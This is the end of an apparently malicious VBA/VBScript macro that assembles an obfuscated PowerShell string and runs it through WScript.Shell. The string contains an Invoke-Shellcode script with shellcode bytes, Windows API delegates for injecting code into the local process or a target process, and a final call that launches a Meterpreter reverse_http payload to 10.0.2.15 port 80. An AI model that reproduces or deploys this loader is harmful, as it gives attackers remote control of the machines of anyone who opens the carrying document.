        XiBVs = XiBVs + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        XiBVs = XiBVs + "x00,0x41,0xba,0x31,0x8b,
                         "
        XiBVs = XiBVs + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        XiBVs = XiBVs + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        XiBVs = XiBVs + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        XiBVs = XiBVs + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        XiBVs = XiBVs + "x47,
                                  0x13,0x72,0"
        XiBVs = XiBVs + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        XiBVs = XiBVs + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        XiBVs = XiBVs + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        XiBVs = XiBVs + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        XiBVs = XiBVs + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        XiBVs = XiBVs + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        XiBVs = XiBVs + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        XiBVs = XiBVs + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        XiBVs = XiBVs + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        XiBVs = XiBVs + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        XiBVs = XiBVs + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        XiBVs = XiBVs + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        XiBVs = XiBVs + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        XiBVs = XiBVs + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        XiBVs = XiBVs + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        XiBVs = XiBVs + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        XiBVs = XiBVs + "ernel32.dll WriteProcessMemory
        $WriteProce"
        XiBVs = XiBVs + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        XiBVs = XiBVs + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        XiBVs = XiBVs + "()) ([Bool])
        $WriteProcessMemory = [System"
        XiBVs = XiBVs + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        XiBVs = XiBVs + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        XiBVs = XiBVs + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        XiBVs = XiBVs + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        XiBVs = XiBVs + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        XiBVs = XiBVs + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        XiBVs = XiBVs + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        XiBVs = XiBVs + "eateRemoteThread = [System.Runtime.InteropServices"
        XiBVs = XiBVs + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        XiBVs = XiBVs + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        XiBVs = XiBVs + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        XiBVs = XiBVs + " CloseHandle
        $CloseHandleDelegate = Get-De"
        XiBVs = XiBVs + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        XiBVs = XiBVs + "le = [System.Runtime.InteropServices.Marshal]::Get"
        XiBVs = XiBVs + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        XiBVs = XiBVs + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        XiBVs = XiBVs + ".ShouldContinue( 'Do you wish to carry out your ev"
        XiBVs = XiBVs + "il plans?',
                 "Injecting shellcode "
        XiBVs = XiBVs + "injecting into $((Get-Process -Id $ProcessId).Proc"
        XiBVs = XiBVs + "essName) ($ProcessId)!" ) )
        {
            "
        XiBVs = XiBVs + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        XiBVs = XiBVs + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        XiBVs = XiBVs + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        XiBVs = XiBVs + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        XiBVs = XiBVs + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        XiBVs = XiBVs + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        XiBVs = XiBVs + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        XiBVs = XiBVs + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        XiBVs = XiBVs + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        XiBVs = XiBVs + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        XiBVs = XiBVs + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        XiBVs = XiBVs + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        XiBVs = XiBVs + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        XiBVs = XiBVs + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        XiBVs = XiBVs + "rocAddress kernel32.dll CreateThread
        $Crea"
        XiBVs = XiBVs + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        XiBVs = XiBVs + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        XiBVs = XiBVs + "IntPtr])
        $CreateThread = [System.Runtime.I"
        XiBVs = XiBVs + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        XiBVs = XiBVs + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        XiBVs = XiBVs + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        XiBVs = XiBVs + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        XiBVs = XiBVs + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        XiBVs = XiBVs + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        XiBVs = XiBVs + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        XiBVs = XiBVs + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        XiBVs = XiBVs + "ForSingleObjectDelegate)
        if ( $Force -or $"
        XiBVs = XiBVs + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        XiBVs = XiBVs + " your evil plans?',
                 "Injecting sh"
        XiBVs = XiBVs + "ellcode into the running PowerShell process!" ) )
"
        XiBVs = XiBVs + "        {
            Inject-LocalShellcode
      "
        XiBVs = XiBVs + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        XiBVs = XiBVs + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        XiBVs = XiBVs + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(XiBVs)
End Function
